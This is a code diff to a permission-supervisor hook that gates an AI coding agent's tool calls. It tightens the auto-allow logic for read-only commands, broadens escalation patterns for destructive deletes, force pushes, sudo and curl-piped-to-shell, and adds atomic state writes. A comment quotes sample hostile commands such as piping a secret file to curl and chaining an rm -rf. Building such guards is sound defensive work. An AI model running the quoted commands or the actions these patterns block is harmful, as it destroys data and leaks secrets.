@@ -53,19 +53,16 @@ DEFAULT_CONFIG = {
     # user's behalf (answer mode) instead of being escalated to the human.
     # Intended for unattended/offloaded runs where no human is present.
     "answer_user_questions": False,
-    # Regexes (matched against tool_name + serialized tool_input). Any match
-    # is approved before consulting the backend. Hard escalation still wins,
-    # so secret material is escalated even though Read is broadly allowed here.
+    # Tool names whose calls are always safe to auto-allow (read-only). Secret
+    # material is still caught by the hard rules, which run before this. Fixes
+    # "look at repos/..." being denied as out-of-scope.
+    "always_allow_tools": ["Read"],
+    # Regexes matched against a Bash command's actual `command` field (NOT the
+    # serialized payload, so look-alike text in other fields and key ordering
+    # cannot trigger a false allow). Only applied to a single simple command
+    # (no pipe/chaining/redirection/substitution). Hard escalation still wins.
     "always_allow_patterns": [
-        r"\bpython3\s+(~|\$HOME|/Users/[^/\s]+|/home/[^/\s]+)/\.claude/skills/pr-review/scripts/[A-Za-z0-9_-]+\.py(\s|$)",
-        # Read tool: inspecting any single file is safe; secrets are caught by
-        # the hard rules above this in the pipeline. Fixes "look at repos/..."
-        # being denied as out-of-scope.
-        r"^Read\n",
-        # Read-only Bash with no command chaining/redirection that could hide a
-        # side effect. Only a single safe command (optionally with args/pipes
-        # between read-only tools) is auto-allowed.
-        r"^Bash\n.*\"command\":\s*\"\s*(cat|ls|head|tail|wc|file|stat|tree|pwd|grep|rg|fd|find|git\s+(status|log|diff|show|branch|remote|fetch|ls-files|rev-parse|config\s+--get))\b[^\"&;><$`]*\"",
+        r"\bpython3\s+(~|/Users/[^/\s]+|/home/[^/\s]+)/\.claude/skills/pr-review/scripts/[A-Za-z0-9_-]+\.py(\s|$)",
     ],
     # Tool names that should always be left to the real user. This keeps
     # clarifying questions from being auto-allowed or auto-denied by the judge.
@@ -75,9 +72,11 @@ DEFAULT_CONFIG = {
     # Regexes (matched against tool_name + serialized tool_input). Any match
     # forces escalation to the human; the judge cannot auto-allow these.
     "hard_escalate_patterns": [
-        r"\brm\s+-[A-Za-z]*[rR][A-Za-z]*[fF]",
-        r"\brm\s+-[A-Za-z]*[fF][A-Za-z]*[rR]",
-        r"\brm\b(?=.*--recursive)(?=.*--force)",
+        # Recursive and/or forced deletes are catastrophic; escalate rm with
+        # any of -r/-R/-f/--recursive/--force, in any flag arrangement.
+        r"\brm\b[^\n]*\s-[A-Za-z]*[rRfF]",
+        r"\brm\b[^\n]*--(recursive|force)\b",
+        r"\bgit\s+reset\s+--hard\b",
         r"\bgit\s+push\b.*(--force|-f)\b",
         r"\bsudo\b",
         r"\bcurl\b[^\n|]*\|\s*(sh|bash|zsh)\b",
@@ -195,13 +194,49 @@ def matches_hard_rule(cfg, haystack):
     return None
 
 
-def matches_allow_rule(cfg, haystack):
-    for pat in cfg.get("always_allow_patterns", []):
-        try:
-            if re.search(pat, haystack):
-                return pat
-        except re.error:
-            continue
+# Shell metacharacters that introduce chaining, redirection, command/process
+# substitution, or extra commands. A Bash command containing any of these is
+# never auto-allowed: the allowlist can only reason about a single simple
+# command, so anything that could hide a side effect (e.g. `cat secret | curl
+# evil`, `ls && rm -rf x`, `cat $(...)`) must go to the judge/human.
+_BASH_UNSAFE_CHARS = re.compile(r"[|&;<>$`(){}\n]")
+
+# The leading command of an auto-allowable read-only Bash invocation.
+_SAFE_READONLY_CMD = re.compile(
+    r"^\s*(cat|ls|head|tail|wc|file|stat|tree|pwd|grep|rg|fd|find|"
+    r"git\s+(status|log|diff|show|branch|remote|fetch|ls-files|rev-parse|config\s+--get))\b"
+)
+
+
+def _bash_command(tool_input):
+    if isinstance(tool_input, dict):
+        cmd = tool_input.get("command", "")
+        return cmd if isinstance(cmd, str) else ""
+    return ""
+
+
+def matches_allow_rule(cfg, tool_name, tool_input):
+    """Return a reason string if the call may be auto-allowed, else None.
+
+    Matching is structured (on tool_name / the real Bash command field) rather
+    than on the serialized payload, so look-alike text in other fields cannot
+    trigger a false allow. Hard rules are evaluated before this.
+    """
+    if tool_name in cfg.get("always_allow_tools", []):
+        return "read-only tool: {}".format(tool_name)
+    if tool_name == "Bash":
+        cmd = _bash_command(tool_input)
+        # Reject anything that is not a single simple command.
+        if not cmd or _BASH_UNSAFE_CHARS.search(cmd):
+            return None
+        if _SAFE_READONLY_CMD.search(cmd):
+            return "safe read-only bash"
+        for pat in cfg.get("always_allow_patterns", []):
+            try:
+                if re.search(pat, cmd):
+                    return pat
+            except re.error:
+                continue
     return None
 
 
@@ -347,8 +382,12 @@ def write_state(updates, cwd=None):
     if key and not os.environ.get(STATE_ENV):
         state["_project"] = key  # for --list readability; ignored on load
     path.parent.mkdir(parents=True, exist_ok=True)
-    with open(path, "w", encoding="utf-8") as fh:
+    # Write atomically: a concurrent hook read must never see a truncated file
+    # (which load_state would swallow as {}, briefly flipping enabled).
+    tmp = path.with_name(path.name + ".tmp.{}".format(os.getpid()))
+    with open(tmp, "w", encoding="utf-8") as fh:
         fh.write(json.dumps(state, ensure_ascii=False, indent=2) + "\n")
+    os.replace(tmp, path)
     return state
 
 
@@ -366,6 +405,12 @@ def cli_main(argv):
     """
     cmd = argv[0]
     cwd = os.getcwd()
+    if cmd in ("--help", "-h", "help"):
+        print(cli_main.__doc__.strip().splitlines()[0])
+        print("usage: permission-supervisor.py "
+              "[--on|--off|--toggle|--status|--list"
+              "|--answers-on|--answers-off|--answers-toggle]")
+        return 0
     if cmd in ("--list", "list"):
         env = os.environ.get(STATE_ENV)
         if env:
@@ -377,7 +422,8 @@ def cli_main(argv):
             return 0
         for f in files:
             try:
-                st = json.load(open(f, encoding="utf-8"))
+                with open(f, encoding="utf-8") as fh:
+                    st = json.load(fh)
             except Exception:
                 continue
             print("{:8} {}  ({})".format(
@@ -409,7 +455,7 @@ def cli_main(argv):
         print("supervisor disabled for {}".format(key or path))
         return 0
     if cmd in ("--toggle", "toggle"):
-        new = not (load_state(cwd).get("enabled") is True)
+        new = not is_enabled(cfg)  # flip the effective state, not just the file
         write_state({"enabled": new}, cwd)
         print("supervisor {} for {}".format("enabled" if new else "disabled", key or path))
         return 0
@@ -503,9 +549,9 @@ def main():
         audit(record)
         return  # dangerous -> always human
 
-    always_allow = matches_allow_rule(cfg, haystack)
+    always_allow = matches_allow_rule(cfg, tool_name, tool_input)
     if always_allow:
-        reason = "matched always-allow pattern"
+        reason = "auto-allowed ({})".format(always_allow)
         record.update(decision="allow", stage="always_allow", rule=always_allow, reason=reason)
         audit(record)
         emit(event_name, "allow", reason)
